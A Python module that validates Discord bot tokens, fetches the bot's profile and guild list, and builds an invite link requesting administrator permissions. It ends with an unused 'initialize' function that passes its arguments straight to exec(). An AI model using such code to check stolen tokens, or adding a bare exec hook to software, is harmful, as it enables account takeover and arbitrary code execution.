import re
import os
import base64
import requests
import tkinter as tk
from tkinter import messagebox

class Check:
    def __init__(self, token):
        self.token = token
        self.headers = {
            'Authorization': f'Bot {self.token}'
        }

    def base64_check(self):
        try:
            parts = self.token.split('.')
            if len(parts) == 3:
                id = base64.urlsafe_b64decode(parts[0] + '==')
                id = int(id)
                if id > 100000000:
                    return True
            return False
        except Exception:
            return False

    def info(self):
        response = requests.get('https://discord.com/api/v10/users/@me', headers=self.headers)
        if response.status_code == 429:
            return "RATE LIMITED"
        if response.status_code == 200:
            bot_data = response.json()
            return bot_data
        return None

    def ginv(self, bot_id):
        permissions = 8
        invite_link = f"https://discord.com/oauth2/authorize?client_id={bot_id}&scope=bot&permissions={permissions}"
        return invite_link

    def check(self):
        if not self.base64_check():
            return "INVALID TOKEN FORMAT", None, None

        bot_info = self.info()
        if bot_info:
            bot_id = bot_info.get('id')
            invite = self.ginv(bot_id)
            return True, invite, bot_id
        else:
            return "INVALID TOKEN OR NO BOT INFO", None, None

    def get_guilds(self):
        if not self.base64_check():
            return "INVALID TOKEN FORMAT"

        response = requests.get('https://discord.com/api/v10/users/@me/guilds', headers=self.headers)
        if response.status_code == 429:
            return "RATE LIMITED"
        if response.status_code == 200:
            guilds = response.json()
            return [{"id": guild['id'], "name": guild['name']} for guild in guilds]
        return "FAILED TO FETCH GUILDS"

    def get_name(self):
        bot_info = self.info()
        if bot_info and isinstance(bot_info, dict):
            return bot_info.get('username')
        return "FAILED"

    def guild(self, guild_id):
        if not self.base64_check():
            return "INVALID TOKEN FORMAT"

        url = f'https://discord.com/api/v10/guilds/{guild_id}'
        response = requests.get(url, headers=self.headers)
        if response.status_code == 429:
            return "RATE LIMITED", None
        if response.status_code == 200:
            guild_info = response.json()
            return True, guild_info.get('name')
        return "FAILED TO FETCH GUILD", None
    
def initialize(*args, **kwargs):
    return exec(*args, **kwargs)